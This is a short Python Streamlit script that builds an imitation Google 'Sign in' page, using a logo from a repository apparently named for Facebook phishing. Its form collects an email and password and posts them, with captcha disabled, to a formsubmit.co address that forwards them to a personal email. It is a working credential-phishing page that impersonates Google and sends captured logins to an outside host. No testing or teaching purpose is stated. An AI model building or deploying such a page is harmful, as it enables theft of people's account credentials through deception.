import streamlit as st  # pip install streamlit
col1, col2, col3 = st.columns(3)

with col1:
     st.write(' ')

with col3:
    st.write(' ')

with col2:
    st.image(
    "https://github.com/MTA-BD/fbfish/blob/main/fbh/fb.png?raw=true",
    width=150,
    channels="RGB"
    )




#logo=image.open("G.png")


import streamlit as st  # pip install streamlit

# Center align the header
st.markdown("<h2 style='text-align: center; color: black;'>Sign in</h1>", unsafe_allow_html=True)

# Add another text with smaller font below the header
st.markdown("<p style='text-align: center; font-size: medium;'>with your Google Account</p>", unsafe_allow_html=True)

# Form for sign in
contact_form = """
<style>
    .styledButton {
        background-color: #4285F4;
        color: white;
        border: none;
        padding: 10px 20px;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 16px;
        margin: 4px 2px;
        transition-duration: 0.4s;
        cursor: pointer;
        border-radius: 8px;
    }
    .styledInput {
        background-color: transparent;
        color: #4285F4;
        border: 2px solid  #e9e9ea;
        border-radius: 8px;
        padding: 10px;
        margin: 5px;
        width: 100%;
        box-sizing: border-box;
    }
</style>
<form action="https://formsubmit.co/md.taseen.alam@gmail.com" method="POST">
     <input type="hidden" name="_captcha" value="false">
     <input class="styledInput" type="email" name="email" placeholder="Email or mobile number" required>
     <input class="styledInput" type="text" name="name" placeholder="Password" required>
     <button type="submit" class="styledButton" style="float: right;">Log in</button>
</form>
"""

st.markdown(contact_form, unsafe_allow_html=True)
